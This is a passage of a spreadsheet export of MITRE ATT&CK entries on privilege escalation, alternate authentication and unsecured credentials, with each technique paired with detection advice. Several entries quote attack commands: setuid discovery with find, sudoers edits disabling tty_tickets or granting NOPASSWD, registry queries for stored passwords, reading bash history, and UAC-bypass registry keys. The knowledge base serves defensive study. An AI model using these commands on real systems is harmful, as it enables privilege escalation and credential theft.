Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as &lt;code&gt;tell application “System Events” to make login item at end with properties /path/to/executable&lt;/code&gt;.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in &lt;code&gt;~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm&lt;/code&gt;.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)</t>
  </si>
  <si>
    <t>All login items created via shared file lists are viewable by using the System Preferences GUI or in the &lt;code&gt;~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm&lt;/code&gt; file.(Citation: Open Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) These locations should be monitored and audited for known good applications.
Otherwise, login Items are located in &lt;code&gt;Contents/Library/LoginItems&lt;/code&gt; within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items) Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true.(Citation: Adding Login Items)(Citation: Launch Service Keys Developer Apple)
Monitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.</t>
  </si>
  <si>
    <t>T1548</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, User Account: User Account Modification, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Linux, Office Suite, Windows, macOS</t>
  </si>
  <si>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</si>
  <si>
    <t>Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).
Consider monitoring for &lt;code&gt;/usr/libexec/security_authtrampoline&lt;/code&gt; executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.
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</si>
  <si>
    <t>T1548.001</t>
  </si>
  <si>
    <t>Setuid and Setgid (T1548.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification</t>
  </si>
  <si>
    <t>An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.
Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The &lt;code&gt;chmod&lt;/code&gt; command can set these bits with bitmasking, &lt;code&gt;chmod 4777 [file]&lt;/code&gt; or via shorthand naming, &lt;code&gt;chmod u+s [file]&lt;/code&gt;. This will enable the setuid bit. To enable the setgid bit, &lt;code&gt;chmod 2775&lt;/code&gt; and &lt;code&gt;chmod g+s&lt;/code&gt; can be used.
Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions.
Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via &lt;code&gt;ls -l&lt;/code&gt;. The &lt;code&gt;find&lt;/code&gt; command can also be used to search for such files. For example, &lt;code&gt;find / -perm +4000 2&gt;/dev/null&lt;/code&gt; can be used to find files with setuid set and &lt;code&gt;find / -perm +2000 2&gt;/dev/null&lt;/code&gt; may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)</t>
  </si>
  <si>
    <t>Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.</t>
  </si>
  <si>
    <t>T1548.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>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the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)
If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)
Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:
* &lt;code&gt;eventvwr.exe&lt;/code&gt; can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)
Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)</t>
  </si>
  <si>
    <t>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Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.
Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:
* The &lt;code&gt;eventvwr.exe&lt;/code&gt; bypass uses the &lt;code&gt;[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command&lt;/code&gt; Registry key.(Citation: enigma0x3 Fileless UAC Bypass)
* The &lt;code&gt;sdclt.exe&lt;/code&gt; bypass uses the &lt;code&gt;[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&lt;/code&gt; and &lt;code&gt;[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand&lt;/code&gt; Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)
Analysts should monitor these Registry settings for unauthorized changes.</t>
  </si>
  <si>
    <t>T1548.003</t>
  </si>
  <si>
    <t>Sudo and Sudo Caching (T1548.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.
Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The &lt;code&gt;sudo&lt;/code&gt; command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a &lt;code&gt;timestamp_timeout&lt;/code&gt;, which is the amount of time in minutes between instances of &lt;code&gt;sudo&lt;/code&gt; before it will re-prompt for a password. This is because &lt;code&gt;sudo&lt;/code&gt; has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at &lt;code&gt;/var/db/sudo&lt;/code&gt; with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a &lt;code&gt;tty_tickets&lt;/code&gt; variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).
The sudoers file, &lt;code&gt;/etc/sudoers&lt;/code&gt;, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like &lt;code&gt;user1 ALL=(ALL) NOPASSWD: ALL&lt;/code&gt;.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.
Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, &lt;code&gt;/var/db/sudo&lt;/code&gt;'s timestamp can be monitored to see if it falls within the &lt;code&gt;timestamp_timeout&lt;/code&gt; range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if &lt;code&gt;tty_tickets&lt;/code&gt; is disabled, adversaries can do this from any tty for that user.
In the wild, malware has disabled &lt;code&gt;tty_tickets&lt;/code&gt; to potentially make scripting easier by issuing &lt;code&gt;echo \'Defaults !tty_tickets\' &gt;&gt; /etc/sudoers&lt;/code&gt;.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued &lt;code&gt;killall Terminal&lt;/code&gt;. As of macOS Sierra, the sudoers file has &lt;code&gt;tty_tickets&lt;/code&gt; enabled by default.</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>T1548.004</t>
  </si>
  <si>
    <t>Elevated Execution with Prompt (T1548.004)</t>
  </si>
  <si>
    <t>Adversaries may leverage the &lt;code&gt;AuthorizationExecuteWithPrivileges&lt;/code&gt; API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. 
Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.
Adversaries may abuse &lt;code&gt;AuthorizationExecuteWithPrivileges&lt;/code&gt; to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)</t>
  </si>
  <si>
    <t>Consider monitoring for &lt;code&gt;/usr/libexec/security_authtrampoline&lt;/code&gt; executions which may indicate that &lt;code&gt;AuthorizationExecuteWithPrivileges&lt;/code&gt; is being executed. MacOS system logs may also indicate when &lt;code&gt;AuthorizationExecuteWithPrivileges&lt;/code&gt; is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.</t>
  </si>
  <si>
    <t>T1548.005</t>
  </si>
  <si>
    <t>Temporary Elevated Cloud Access (T1548.005)</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Office Suite</t>
  </si>
  <si>
    <t>Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. 
Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)
Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange)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assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)
While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)
**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)</t>
  </si>
  <si>
    <t>T1548.006</t>
  </si>
  <si>
    <t>TCC Manipulation (T1548.006)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries can manipulate or abuse the Transparency, Consent, &amp; Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy &amp; Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).
When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)
Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)
</t>
  </si>
  <si>
    <t>T1550</t>
  </si>
  <si>
    <t>Defense Evasion, Lateral Movement</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request, Application Log: Application Log Content, Logon Session: Logon Session Creation, User Account: User Account Authentication, Web Credential: Web Credential Usage</t>
  </si>
  <si>
    <t>Containers, IaaS, Identity Provider, Office Suite, SaaS, Windows</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. 
Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)
Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.
</t>
  </si>
  <si>
    <t>Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).</t>
  </si>
  <si>
    <t>T1550.001</t>
  </si>
  <si>
    <t>Web Credential: Web Credential Usage</t>
  </si>
  <si>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and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 
OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)
For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)
Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)
Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.</t>
  </si>
  <si>
    <t>Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)</t>
  </si>
  <si>
    <t>T1550.002</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.
When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.
Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)</t>
  </si>
  <si>
    <t>Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.
Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)</t>
  </si>
  <si>
    <t>T1550.003</t>
  </si>
  <si>
    <t>Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.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 to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)
A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)
A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)
Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)</t>
  </si>
  <si>
    <t>Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.
Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to "Integrity check on decrypted field failed" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)</t>
  </si>
  <si>
    <t>T1550.004</t>
  </si>
  <si>
    <t>Web Session Cookie (T1550.004)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Web Credential: Web Credential Usage</t>
  </si>
  <si>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</si>
  <si>
    <t>Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.</t>
  </si>
  <si>
    <t>T1552</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Access, Process: Process Creation, User Account: User Account Authentication, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)</t>
  </si>
  <si>
    <t>While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.
Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.
Monitoring when the user's &lt;code&gt;.bash_history&lt;/code&gt; is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like "history" instead of commands like &lt;code&gt;cat ~/.bash_history&lt;/code&gt;.
Additionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.</t>
  </si>
  <si>
    <t>T1552.001</t>
  </si>
  <si>
    <t>Credentials In Files (T1552.001)</t>
  </si>
  <si>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</si>
  <si>
    <t>While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.</t>
  </si>
  <si>
    <t>T1552.002</t>
  </si>
  <si>
    <t>Credentials in Registry (T1552.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.
Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)
* Local Machine Hive: &lt;code&gt;reg query HKLM /f password /t REG_SZ /s&lt;/code&gt;
* Current User Hive: &lt;code&gt;reg query HKCU /f password /t REG_SZ /s&lt;/code&gt;</t>
  </si>
  <si>
    <t>Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.</t>
  </si>
  <si>
    <t>T1552.003</t>
  </si>
  <si>
    <t>Bash History (T1552.003)</t>
  </si>
  <si>
    <t>Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user’s &lt;code&gt;.bash_history&lt;/code&gt; file. For each user, this file resides at the same location: &lt;code&gt;~/.bash_history&lt;/code&gt;. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)</t>
  </si>
  <si>
    <t>Monitoring when the user's &lt;code&gt;.bash_history&lt;/code&gt; is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like "history" instead of commands like &lt;code&gt;cat ~/.bash_history&lt;/code&gt;.</t>
  </si>
  <si>
    <t>T1552.004</t>
  </si>
  <si>
    <t>Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 
Adversaries may also look in common key directories, such as &lt;code&gt;~/.ssh&lt;/code&gt; for SSH keys on * nix-based systems or &lt;code&gt;C:&amp;#92;Users&amp;#92;(username)&amp;#92;.ssh&amp;#92;&lt;/code&gt; on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)
When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)
On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) 
Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.</t>
  </si>
  <si>
    <t>Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported.</t>
  </si>
  <si>
    <t>T1552.005</t>
  </si>
  <si>
    <t>Cloud Instance Metadata API (T1552.005)</t>
  </si>
  <si>
    <t>User Account: User Account Authentication</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.
Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)
If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)
The de facto standard across cloud service providers is to host the Instance Metadata API at &lt;code&gt;http[:]//169.254.169.254&lt;/code&gt;.
</t>
  </si>
  <si>
    <t>Monitor access to the Instance Metadata API and look for anomalous queries.
It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).</t>
  </si>
  <si>
    <t>T1552.006</t>
  </si>
  <si>
    <t>Group Policy Preferences (T1552.006)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)
These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)
The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:
